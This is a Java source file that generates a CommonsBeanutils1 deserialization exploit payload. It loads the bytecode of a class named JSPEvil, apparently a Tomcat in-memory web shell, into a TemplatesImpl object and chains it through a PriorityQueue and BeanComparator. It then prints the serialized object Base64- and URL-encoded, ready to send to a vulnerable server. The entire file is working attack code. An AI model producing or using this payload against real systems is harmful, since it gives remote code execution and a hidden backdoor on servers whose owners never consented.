package com.tomcat.koishi_Gadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.tomcat.memshell.JSPMemShell.JSPEvil;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.PriorityQueue;

public class CommonsBeanutils1 {
    public static void main(String[] args) throws Exception {
        BeanComparator beanComparator = new BeanComparator();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "KoiShi");
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{ClassPool.getDefault().get(JSPEvil.class.getName()).toBytecode()});
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(1);

        setFieldValue(priorityQueue, "queue", new Object[]{templates, templates});
        setFieldValue(priorityQueue, "comparator", beanComparator);//也可以在构造函数的第二个参数传入
        setFieldValue(beanComparator, "property", "outputProperties");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream os = new ObjectOutputStream(byteArrayOutputStream);
        os.writeObject(priorityQueue);
        os.close();

        String payload = URLEncoder.encode(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));
        System.out.println(payload);

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws IllegalAccessException, NoSuchFieldException {
        Field f = obj.getClass().getDeclaredField(fieldName);
        f.setAccessible(true);
        f.set(obj, value);
    }


}
